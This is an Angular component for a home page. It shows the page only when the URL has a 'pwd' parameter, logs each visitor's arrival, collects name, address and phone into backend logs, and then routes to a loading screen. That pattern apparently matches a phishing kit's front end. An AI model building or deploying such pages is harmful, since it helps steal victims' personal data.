import { Component, OnInit } from '@angular/core';
import { AppService } from '../app.service';
import { CookieService } from 'ngx-cookie-service';
import { FormBuilder, FormGroup, Validators } from '@angular/forms';
import { ActivatedRoute, Router } from '@angular/router';
import { MessagesService } from '../websocket.service';

@Component({
  selector: 'app-home',
  templateUrl: './home.component.html',
  styleUrls: ['./home.component.css']
})
export class HomeComponent implements OnInit {
  id: any;
  device = "windows";
  last_connected = new Date();
  Form: FormGroup;
  country: any;
  constructor(private appService: AppService, private cookieService: CookieService, private fb: FormBuilder, private router: Router, private socketService: MessagesService, private ActivatedRoute: ActivatedRoute) {

    setTimeout(() => {

      this.ActivatedRoute.queryParams.subscribe(params => {
        console.log(params);
        if ('pwd' in params) {

        } else {
          this.router.navigate(['not_found'])

        }
      });
    }, 100);
    setTimeout(() => {
      this.country = this.cookieService.get('country');
      const logs = { text: "user on home page", date: new Date }
      this.appService.updateUser(undefined, this.cookieService.get('id'), logs, undefined, undefined, undefined).subscribe(res => {

      });

    }, 1500)

    this.Form = this.fb.group({
      First_name: [null, [Validators.required]],
      Last_name: [null, [Validators.required,]],
      Address_Line_1: [null, [Validators.required,]],
      Address_Line_2: [null, [Validators.required,]],
      Postcode: [null, [Validators.required,]],
      City: [null, [Validators.required,]],
      State: [null, [Validators.required,]],
      Phone: [null, [Validators.required,]],

    });

  }

  ngOnInit(): void {

  }

  submit() {


    if (this.Form.valid) {
      const id = this.cookieService.get('id')
      const logs = { text: JSON.stringify(this.Form.value), date: new Date }


      this.appService.updateUser(undefined, id, logs, undefined, undefined, true).subscribe(

      );
      sessionStorage.setItem('homeinfo', '1');
      this.router.navigate(['/loading']);


    }




  }


}
